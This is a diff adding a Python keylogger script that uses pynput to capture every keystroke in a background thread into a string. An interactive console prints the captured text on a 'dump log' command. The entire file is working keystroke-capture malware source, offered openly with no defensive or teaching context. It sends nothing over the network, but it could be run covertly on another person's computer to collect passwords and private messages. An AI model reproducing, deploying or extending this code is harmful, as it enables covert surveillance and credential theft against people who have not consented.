@@ -1,0 +1,70 @@
+from threading import Thread
+import pynput.keyboard
+from termcolor import cprint
+from Colors.color import Color
+
+keylogvar = ""
+running = True
+keyboard_Listener = None
+color = Color()
+
+
+def process_Key_Press(key):
+    global keylogvar
+    try:
+        keylogvar += str(key.char)
+    except AttributeError:
+        if key == key.space:
+            keylogvar += " "
+        else:
+            # keylogvar += str(key)
+            keylogvar += " "
+
+
+def keyBoardLoggerFunc():
+    global keyboard_Listener
+    try:
+        keyboard_Listener = pynput.keyboard.Listener(on_press=process_Key_Press)
+        with keyboard_Listener:
+            keyboard_Listener.join()
+    except Exception as ex:
+        cprint("[-]Something wen Wrong", color.red)
+    finally:
+        cprint("[-] Terminating keyLoggerThread...", color.red)
+
+
+def handler():
+    global keylogvar
+    global running
+    while running:
+        try:
+            command = input("[+]> What do you want to do:").strip()
+            if command == "dump log":
+                print(keylogvar)
+            elif command == "quit":
+                running = False
+                if keyboard_Listener:
+                    cprint(
+                        "[-] Starting To terminate keylogger thread ...", color.yellow
+                    )
+                    keyboard_Listener.stop()
+        except Exception as ex:
+            cprint("[-] Handler Error:", color.red)
+            print(str(ex))
+
+
+def main():
+    try:
+        cprint("[+] Starting keylogger thread ....")
+        keylogthread = Thread(target=keyBoardLoggerFunc)
+        keylogthread.start()
+        cprint("[+] Started keylogger thread ....", color.green)
+        handler()
+        keylogthread.join()
+        cprint("[+] Keylogger thread terminated.", color.red)
+    except KeyboardInterrupt:
+        cprint("[-] Operation Cancelled", "red")
+
+
+if __name__ == "__main__":
+    main()
